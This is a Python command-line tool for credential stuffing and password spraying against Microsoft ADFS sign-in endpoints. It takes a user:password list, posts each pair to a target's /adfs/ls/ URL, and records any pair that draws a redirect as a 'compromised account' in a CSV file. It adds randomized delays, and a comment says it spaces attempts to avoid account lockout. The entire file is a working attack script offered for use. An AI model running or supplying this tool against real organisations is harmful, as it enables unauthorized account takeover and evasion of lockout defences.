import argparse
import logging
import time
import urllib
import requests
import csv
from random import randint

requests.packages.urllib3.disable_warnings()

logging.basicConfig(level=logging.INFO, format='%(message)s')
LOGGER = logging.getLogger()

def random_time(minimum, maximum):
    sleep_amount = randint(minimum, maximum)
    return sleep_amount

def output(status, username, password, target, output_file_name):
    try:
        with open(output_file_name + ".csv", mode='a') as log_file:
            creds_writer = csv.writer(log_file, delimiter=',', quotechar='"')
            creds_writer.writerow([status, username, password, target])
    except Exception as output_err:
        LOGGER.critical("[!] Error writing to output file: {}".format(output_err))

def adfs_attempts(users, passes, targets, output_file_name, sleep_time, random, min_sleep, max_sleep, verbose):
    working_creds_counter = 0  # zeroing the counter of working creds before starting to count

    try:
        LOGGER.info("[*] Started running at: %s" % time.strftime('%d-%m-%Y %H:%M:%S'))
        output('Status', 'Username', 'Password', 'Target', output_file_name)  # creating the 1st line in the output file

        for target in targets:  # checking each target separately
            for i in range(len(users)):  # trying one password against each user, less likely to lockout users
                username = users[i]
                password = passes[i]
                target_url = "%s/adfs/ls/?client-request-id=&wa=wsignin1.0&wtrealm=urn%%3afederation" \
                             "%%3aMicrosoftOnline&wctx=cbcxt=&username=%s&mkt=&lc=" % (target, username)
                post_data = urllib.parse.urlencode({'UserName': username, 'Password': password,
                                                    'AuthMethod': 'FormsAuthentication'}).encode('ascii')
                session = requests.Session()
                session.auth = (username, password)
                response = session.post(target_url, data=post_data, allow_redirects=False,
                                        headers={'Content-Type': 'application/x-www-form-urlencoded',
                                                 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:65.0) '
                                                               'Gecko/20100101 Firefox/65.0',
                                                 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9, '
                                                           'image/webp,*/*;q=0.8'})
                status_code = response.status_code
                if status_code == 302:
                    status = 'Valid creds'
                    output(status, username, password, target, output_file_name)
                    working_creds_counter += 1
                    LOGGER.info("[+] Seems like the creds are valid: %s :: %s on %s" % (username, password, target))
                else:
                    status = 'Invalid'
                    if verbose:
                        output(status, username, password, target, output_file_name)
                    LOGGER.debug("[-]Creds failed for: %s" % username)
                if random is True:  # let's wait between attempts
                    sleep_time = random_time(min_sleep, max_sleep)
                    time.sleep(float(sleep_time))
                else:
                    time.sleep(float(sleep_time))

        LOGGER.info("[*] Overall compromised accounts: %s" % working_creds_counter)
        LOGGER.info("[*] Finished running at: %s" % time.strftime('%d-%m-%Y %H:%M:%S'))
    except Exception as e:
        LOGGER.critical("[!] Error: {}".format(e))

def parse_userpass_list(incoming_list):
    try:
        with open(incoming_list) as f:
            userpass_list = [line.strip().split(":") for line in f.readlines()]
        return [item[0] for item in userpass_list], [item[1] for item in userpass_list]
    except FileNotFoundError:
        LOGGER.critical("[!] File not found: {}".format(incoming_list))
    except Exception as err:
        LOGGER.critical("[!] Error: {}".format(err))

def main():
    parser = argparse.ArgumentParser(description='ADFS Credential tester')
    parser.add_argument('-l', '--list', help='User:password list file', required=True)
    parser.add_argument('-t', '--target', help='ADFS target URL', required=True)
    parser.add_argument('-o', '--output', help='Output file name', default='ADFS_output')
    parser.add_argument('-v', '--verbose', help='Enable verbose logging', action='store_true')
    parser.add_argument('-s', '--sleep', help='Sleep time between attempts', type=int, default=0)
    parser.add_argument('-r', '--random', help='Randomize sleep time between attempts', nargs=2, type=int)

    args = parser.parse_args()

    users, passes = parse_userpass_list(args.list)
    targets = [args.target]
    output_file_name = args.output
    sleep_time = args.sleep
    random = False
    min_sleep, max_sleep = 0, 0

    if args.random:
        random = True
        min_sleep = args.random[0]
        max_sleep = args.random[1]

    adfs_attempts(users, passes, targets, output_file_name, sleep_time, random, min_sleep, max_sleep, args.verbose)

if __name__ == "__main__":
    main()

